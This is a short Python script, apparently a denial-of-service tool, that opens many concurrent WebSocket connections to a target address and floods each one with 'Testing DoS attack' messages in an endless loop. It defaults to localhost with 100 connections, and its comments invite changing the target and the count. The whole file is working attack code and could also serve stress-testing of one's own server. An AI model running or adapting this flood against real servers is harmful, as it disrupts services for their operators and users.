import asyncio
import websockets
import time

async def attack_websocket(uri, count):
    async def connect_and_send():
        try:
            async with websockets.connect(uri) as websocket:
                while True:
                    # Send a dummy message
                    await websocket.send('Testing DoS attack')
                    # Sleep briefly to control the rate of sending messages
                    await asyncio.sleep(0.1)
        except websockets.ConnectionClosed:
            pass

    tasks = [connect_and_send() for _ in range(count)]

    await asyncio.gather(*tasks)

# Replace 'ws://localhost:5000' with the WebSocket server address
uri = 'ws://localhost:5000'
number_of_connections = 100  # Adjust this number based on your test needs

asyncio.run(attack_websocket(uri, number_of_connections))
